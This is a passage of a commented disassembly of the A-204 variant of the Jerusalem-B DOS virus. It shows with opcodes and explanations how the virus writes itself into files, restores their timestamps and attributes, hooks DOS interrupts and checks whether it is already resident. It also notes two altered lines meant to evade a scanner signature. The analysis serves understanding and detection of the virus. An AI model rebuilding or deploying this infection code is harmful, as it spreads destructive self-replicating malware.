063E F7 36 78 00             DIV W[078]		;
0642 0B D2                   OR DX,DX		; 
0644 74 01                   JE 0647		; 
0646 40                      INC AX		; AX=AX+01h
0647 A3 53 00                MOV W[053],AX	;
064A 89 16 51 00             MOV W[051],DX	;
064E A1 7C 00                MOV AX,W[07C]	; Restore AX
0651 8B 16 7E 00             MOV DX,W[07E]	; Restore DX
0655 F7 36 7A 00             DIV W[07A]		;
0659 2B 06 57 00             SUB AX,W[057]	;
065D A3 65 00                MOV W[065],AX	;
0660 C7 06 63 00 C5 00       MOV W[063],0C5	;
0666 A3 5D 00                MOV W[05D],AX	;
0669 C7 06 5F 00 10 07       MOV W[05F],0710	;
066F 33 C9                   XOR CX,CX		; CX=0000h
0671 8B D1                   MOV DX,CX		; DX=0000h
0673 B8 00 42                MOV AX,04200	; Move File Read/Write
0676 CD 21                   INT 021		; pointer to beginning of
						; file

0678 72 0A                   JB 0684		; If Error: -> 0684h
067A B9 1C 00                MOV CX,01C		; CX=1Ch
067D BA 4F 00                MOV DX,04F		; DX=4Fh
0680 B4 40                   MOV AH,040		; Write to file with
0682 CD 21                   INT 021		; handle

0684 72 11                   JB 0697		; If Error: -> 0697h
0686 3B C1                   CMP AX,CX		; Are all bytes written?
0688 75 18                   JNE 06A2		; No: -> 06A2h
068A 8B 16 7C 00             MOV DX,W[07C]	; Restore AX into DX
068E 8B 0E 7E 00             MOV CX,W[07E]	; Restore DX into CX
0692 B8 00 42                MOV AX,04200
0695 CD 21                   INT 021

0697 72 09                   JB 06A2		; If Error: -> 06A2h
0699 33 D2                   XOR DX,DX		; DX=0000h
069B B9 10 07                MOV CX,0710	; CX=0710h
069E B4 40                   MOV AH,040
06A0 CD 21                   INT 021

06A2 2E 83 3E 8F 00 00       CS CMP W[08F],0	; Not Enough Memory?
06A8 74 04                   JE 06AE		; Yes: -> 06AEh
06AA B4 49                   MOV AH,049		; Free memory
06AC CD 21                   INT 021		;

06AE 2E 83 3E 70 00 FF       CS CMP W[070],-1
06B4 74 31                   JE 06E7
06B6 2E 8B 1E 70 00          CS MOV BX,W[070]	; Restore File Handle
06BB 2E 8B 16 74 00          CS MOV DX,W[074]	; Restore File Date
06C0 2E 8B 0E 76 00          CS MOV CX,W[076]	; Restore File Time
06C5 B8 01 57                MOV AX,05701	; Set File's Date/Time
06C8 CD 21                   INT 021		; stamp

06CA B4 3E                   MOV AH,03E		; Close a file with
06CC CD 21                   INT 021		; handle

06CE 2E C5 16 80 00          CS LDS DX,[080]	; Get place (DS:DX) of
						; filename
06D3 2E 8B 0E 72 00          CS MOV CX,W[072]	; Restore File Attributes
06D8 B8 01 43                MOV AX,04301	; Put File Attributes
06DB CD 21                   INT 021		;

06DD 2E C5 16 1B 00          CS LDS DX,[01B]	; Restore original vector
06E2 B8 24 25                MOV AX,02524	; of interrupt 24h
06E5 CD 21                   INT 021		;

06E7 07                      POP ES		; Restore Registers
06E8 1F                      POP DS
06E9 5F                      POP DI
06EA 5E                      POP SI
06EB 5A                      POP DX
06EC 59                      POP CX
06ED 5B                      POP BX
06EE 58                      POP AX
06EF 9D                      POPF		; Restore Flags
06F0 2E FF 2E 17 00          CS JMP D[017]	; Call original INT 21h
						; address which was intercep-
						; ted with the LOAD & EXEC.
						; statement. Which means it 
						; will load and execute the
						; selected file

06F5 00 00 00 00 00 00 00 00 00 00 00

0700 4D DE 0C 00 10 00 00 00 00 00 00 00 00 00 00 00

0710 E9 92 00                JMP 07A5		; JUMP -> 07A5h

0711h til 07A4h are the same definition words/bytes as at 0103h til 0194h

07A5 FC                      CLD
07A6 B4 E0                   MOV AH,0E0
07A8 CD 21                   INT 021

07AA 80 FC E0                CMP AH,0E0		; AH>=E0h?
07AD 73 16                   JAE 07C5		; Yes: -> 07C5h
07AF 80 FC 03                CMP AH,3		; AH<03h
07B2 72 11                   JB 07C5		; Yes: -> 07C5h
						; The only way that the
						; code get passed here if
						; the virus is active in
						; memory. It will return
						; AX=0300h then.
07B4 B4 DD                   MOV AH,0DD
07B6 BF 00 01                MOV DI,0100	; DI=0100h
07B9 BE 10 07                MOV SI,0710	; SI=0710h
07BC 03 F7                   ADD SI,DI		; SI=0810h
07BE 2E 8B 8D 11 00          CS MOV CX,W[DI+011]; CX=Length of file
07C3 CD 21                   INT 021

07C5 8C C8                   MOV AX,CS		; AX=CS
07C7 05 10 00                ADD AX,010		; AX=AX+10h
07CA 8E D0                   MOV SS,AX		; SS=CS+10h
07CC BC 00 07                MOV SP,0700	; SP=0700h
07CF 50                      PUSH AX		; Store AX
07D0 B8 C5 00                MOV AX,0C5		; AX=00C5h
07D3 50                      PUSH AX		; Store AX
07D4 CB                      RETF		; RETURN from FAR

07D5 FC                      CLD		; Clear Direct

						; Here the A-204 variant
						; differs from the original
						; Jerusalem Version B virus
						; for the second time.
07D6 2E 8C 06 31 00          CS MOV W[031],ES	; These two lines have
07DB 06                      PUSH ES		; been changed in order
						; trying to avoid being
						; detected by the finger-
						; print in the VirScan.Dat
						; file. It has not succeeded
						; because the strain VirScan
						; searches for appears two
						; times in the viruscode

07DC 2E 8C 06 39 00          CS MOV W[039],ES	; Store ES
07E1 2E 8C 06 3D 00          CS MOV W[03D],ES	; Store ES
07E6 2E 8C 06 41 00          CS MOV W[041],ES	; Store ES

07EB 8C C0                   MOV AX,ES		; AX=ES
07ED 05 10 00                ADD AX,010		; AX=AX+10h
07F0 2E 01 06 49 00          CS ADD W[049],AX	; Store ES+10h
07F5 2E 01 06 45 00          CS ADD W[045],AX	; Store ES+10h

07FA B4 E0                   MOV AH,0E0		; AH=E0h
07FC CD 21                   INT 021		;

07FE 80 FC E0                CMP AH,0E0		; AH>=E0?
0801 73 13                   JAE 0816		; Yes: -> 0816h
						; This will never happen.
						; First of all it would be
						; a short jump into the
						; original program. Secondly
						; is the virus already active
						; in memory and will return
						; AX=0300h at the INT 21h call
						; with AH=E0h
0803 80 FC 03                CMP AH,3		; AH=03h
0806 07                      POP ES		; Restore ES
0807 2E 8E 16 45 00          CS MOV SS,W[045]	; Restore ES+10 into SS
080C 2E 8B 26 43 90          CS MOV SP,W[09043]	;

0810 90 		     NOP		; Start ofOriginal Program
0811 90                      NOP 		
0812 90                      NOP
0813 90                      NOP
0814 90                      NOP
0815 90                      NOP
0816 90                      NOP
0817 90                      NOP
0818 90                      NOP
0819 90                      NOP
081A 90                      NOP
081B 90                      NOP
081C 90                      NOP
081D 90                      NOP
081E 90                      NOP
081F 90                      NOP
0820 90                      NOP
0821 90                      NOP
0822 90                      NOP
0823 90                      NOP
0824 90                      NOP
0825 90                      NOP
0826 90                      NOP
0827 90                      NOP
0828 90                      NOP
0829 90                      NOP
082A 90                      NOP
082B 90                      NOP
082C 90                      NOP
082D 90                      NOP
082E 90                      NOP
082F C3                      RET		; End of Original Program

0830 2D 32 30 34 2A             	      	; -204*

NOTE: A-204 is a course-code for IAP (Inleiding Apparatuur en Programmatuur,
in English a Prologue in Hardware and Software) at my university. In this
course the PDP-11 Language is being teached. It's my opion, and my opion only,
that this change has been made by a first year student. The IAP-course is
a course for first years students. Only some lines were changed in order to
avoid detection. If the 'author' did know more about the 8086, (s?)he could
have optimized the code. Some pieces can be done much more elegant.